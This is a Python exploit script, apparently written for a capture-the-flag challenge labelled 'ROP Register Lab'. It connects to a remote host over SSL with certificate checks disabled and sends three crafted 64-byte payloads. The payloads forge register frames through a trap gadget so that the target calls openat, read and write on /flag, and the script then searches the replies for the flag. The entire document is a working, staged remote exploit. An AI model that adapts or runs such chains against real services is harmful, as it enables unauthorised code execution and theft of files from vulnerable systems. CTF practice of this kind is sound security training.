#!/usr/bin/env python3
"""Remote exploit v2: debug and handle remote environment."""
import struct, socket, ssl, sys, time

HOST = "fpztdaff-m4sy-lecb-yh9e-6a5acab230525-neptunus.nepctf.com"
PORT = 443

SYS_OPENAT = 56
SYS_READ   = 63
SYS_WRITE  = 64
AT_FDCWD = 0xFFFFFF9C
BSS_BUF  = 0x4bd88
TRAP0    = 0x2ba08
RESTART  = 0x21168

def build_note(base, sysno, r0, r1, r2, r3=0, r4=0, r5=0, flag_str=None):
    note = bytearray(64)
    struct.pack_into('<I', note, 4, r5)
    struct.pack_into('<I', note, 8, r4)
    struct.pack_into('<I', note, 12, r3)
    struct.pack_into('<I', note, 16, r2)
    struct.pack_into('<I', note, 20, r1)
    struct.pack_into('<I', note, 24, r0)
    struct.pack_into('<I', note, 28, sysno)
    if flag_str:
        note[32:32+len(flag_str)] = flag_str
    struct.pack_into('<I', note, 48, base + 56)
    struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56)
    struct.pack_into('<I', note, 60, RESTART)
    return note

b1, b2, b3 = 0x4080e4c0, 0x4080e440, 0x4080e3c0
note1 = build_note(b1, SYS_OPENAT, AT_FDCWD, b1 + 32, 0, flag_str=b'/flag\x00')
note2 = build_note(b2, SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note(b3, SYS_WRITE, 1, BSS_BUF, 0x100)

print(f"[*] Connecting to {HOST}:{PORT} over SSL...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(15)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ssock = ctx.wrap_socket(sock, server_hostname=HOST)
ssock.connect((HOST, PORT))
print("[*] Connected!")

def recv_until(marker, timeout=5):
    data = b''
    ssock.settimeout(timeout)
    while marker not in data:
        try:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data

# Initial menu
data = recv_until(b'> ')
print(f"[*] Initial: {len(data)}B")
print(f"    Last 80 chars: {data[-80:]}")

# Stage 1
print(f"\n[*] Stage 1: openat")
ssock.send(b'3\n' + bytes(note1) + b'\n')
time.sleep(0.5)
data1 = recv_until(b'ROP Register Lab', timeout=8)
print(f"[*] S1 ROP banner found: {len(data1)}B")
print(f"    Last 200 chars: {data1[-200:]}")
data1b = recv_until(b'> ', timeout=5)
print(f"[*] S1 prompt: {len(data1b)}B")
print(f"    Last 200 chars: {data1b[-200:]}")

# Stage 2
print(f"\n[*] Stage 2: read")
ssock.send(b'3\n' + bytes(note2) + b'\n')
time.sleep(0.5)
data2 = recv_until(b'ROP Register Lab', timeout=8)
print(f"[*] S2 ROP banner found: {len(data2)}B")
print(f"    Last 200 chars: {data2[-200:]}")
data2b = recv_until(b'> ', timeout=5)
print(f"[*] S2 prompt: {len(data2b)}B")
print(f"    Last 200 chars: {data2b[-200:]}")

# Stage 3
print(f"\n[*] Stage 3: write")
ssock.send(b'3\n' + bytes(note3) + b'\n')
time.sleep(1)
data3 = ssock.recv(16384)
print(f"[*] S3 output: {len(data3)}B")
print(repr(data3[:500]))

# Exit and get any remaining
ssock.send(b'5\n')
time.sleep(0.5)
try:
    data3b = ssock.recv(16384)
    print(f"[*] S3b: {len(data3b)}B")
except:
    pass

ssock.close()

# Look for flag in all collected data
all_data = data + data1 + data1b + data2 + data2b + data3
text = all_data.decode(errors='replace')
import re
print(f"\n=== FLAG SEARCH ===")
for m in re.finditer(r'[a-zA-Z0-9_]{5,40}', text):
    s = m.group()
    if 'flag' in s.lower() or ('_' in s and not s.startswith('_')):
        idx = text.find(s)
        context = text[max(0,idx-10):idx+len(s)+10]
        print(f"  Found: '{s}' context: {repr(context)}")
